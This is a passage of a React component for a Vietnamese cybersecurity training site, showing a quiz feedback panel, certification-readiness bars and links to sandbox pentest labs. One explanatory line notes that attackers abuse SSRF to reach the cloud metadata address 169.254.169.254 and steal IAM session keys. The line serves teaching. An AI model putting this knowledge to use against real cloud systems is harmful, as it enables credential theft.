                      <span className="text-emerald-600 dark:text-emerald-400">Chính xác! +150 XP đã cộng vào hồ sơ</span>
                    </>
                  ) : (
                    <>
                      <AlertTriangle className="h-4 w-4 text-amber-600 dark:text-amber-400 shrink-0" />
                      <span className="text-amber-600 dark:text-amber-400">Phân tích chiến thuật bổ sung</span>
                    </>
                  )}
                </div>
                <p className="text-slate-600 dark:text-slate-300 text-[11px] leading-relaxed">
                  Địa chỉ IP <code className="font-mono text-blue-600 dark:text-cyan-400 bg-white dark:bg-slate-900 px-1 py-0.5 rounded border border-slate-200 dark:border-slate-800">169.254.169.254</code> là địa chỉ link-local của AWS/Azure Instance Metadata Service (IMDS). Kẻ tấn công lợi dụng lỗ hổng SSRF để đánh cắp IAM Temporary Session Keys.
                </p>
                <button
                  onClick={handleDrillReset}
                  className="inline-flex items-center gap-1 text-[11px] font-bold text-blue-600 dark:text-cyan-400 hover:underline pt-1 cursor-pointer font-mono"
                >
                  <RotateCcw className="h-3 w-3" />
                  <span>Thử lại kịch bản khác</span>
                </button>
              </div>
            )}
          </div>

          {/* ====================================================================
              WIDGET 2: INDUSTRY CERTIFICATION ROADMAP MAPPING
             ==================================================================== */}
          <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-md space-y-4 text-slate-900 dark:text-white">
            <div className="flex items-center gap-2">
              <Award className="h-4 w-4 text-blue-600 dark:text-cyan-400" />
              <h3 className="text-sm font-bold text-slate-900 dark:text-white">
                Mức Độ Chuẩn Bị Chứng Chỉ Quốc Tế
              </h3>
            </div>

            <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed font-sans">
              Các bài học được chuẩn hóa theo format đề thi offensive & defensive thực chiến:
            </p>

            <div className="space-y-3">
              {[
                { name: "CompTIA Security+ (SY0-701)", readiness: 85, color: "bg-blue-600 dark:bg-cyan-500" },
                { name: "Certified Ethical Hacker (CEH v12)", readiness: 65, color: "bg-indigo-600 dark:bg-blue-500" },
                { name: "OffSec Certified Professional (OSCP)", readiness: 40, color: "bg-amber-500" },
                { name: "Certified Cloud Security (CCSP)", readiness: 25, color: "bg-indigo-500" },
              ].map((cert, i) => (
                <div key={i} className="space-y-1">
                  <div className="flex justify-between text-xs font-semibold">
                    <span className="text-slate-700 dark:text-slate-300 truncate max-w-[200px]">{cert.name}</span>
                    <span className="font-mono text-blue-600 dark:text-cyan-400 font-bold">
                      <CountUp end={cert.readiness} suffix="%" />
                    </span>
                  </div>
                  <div className="h-1.5 w-full bg-slate-100 dark:bg-slate-950 rounded-full overflow-hidden">
                    <div
                      className={`h-full ${cert.color} rounded-full transition-all duration-500`}
                      style={{ width: `${cert.readiness}%` }}
                    />
                  </div>
                </div>
              ))}
            </div>

            <div className="pt-2">
              <Link
                to="/learning-paths"
                className="w-full block text-center py-2.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-mono text-xs transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
              >
                Khám Phá Lộ Trình Sự Nghiệp &rarr;
              </Link>
            </div>
          </div>

          {/* ====================================================================
              WIDGET 3: LIVE TERMINAL LAB SHORTCUT
             ==================================================================== */}
          <div className="p-5 rounded-3xl bg-gradient-to-br from-slate-900 to-blue-950 text-white shadow-xl space-y-3 border border-blue-500/30">
            <div className="flex items-center gap-2 font-mono text-xs text-cyan-300 font-bold">
              <Terminal className="h-4 w-4" />
              <span>SANDBOX TERMINAL SẴN SÀNG</span>
            </div>
            <p className="text-xs text-slate-300 leading-relaxed font-sans">
              Mỗi bài giảng liên kết trực tiếp với máy ảo Linux container có sẵn bộ công cụ pentest & phân tích gói tin.
            </p>
            <Link
              to="/labs"
              className="inline-block w-full text-center py-2.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs shadow-lg shadow-cyan-500/20 transition-all cursor-pointer"
            >
              Khởi Động Cyber Range Labs
            </Link>
          </div>
        </div>
      </div>

      {/* Slide-over Course Syllabus Drawer */}
      <CourseSyllabusDrawer
        course={drawerCourse}
        isOpen={!!drawerCourse}
        onClose={() => setDrawerCourse(null)}
      />

      {/* Flagship Interactive Mission Lesson Modal */}
      <InteractiveLessonModal />
    </div>
  )
}

export default Learning
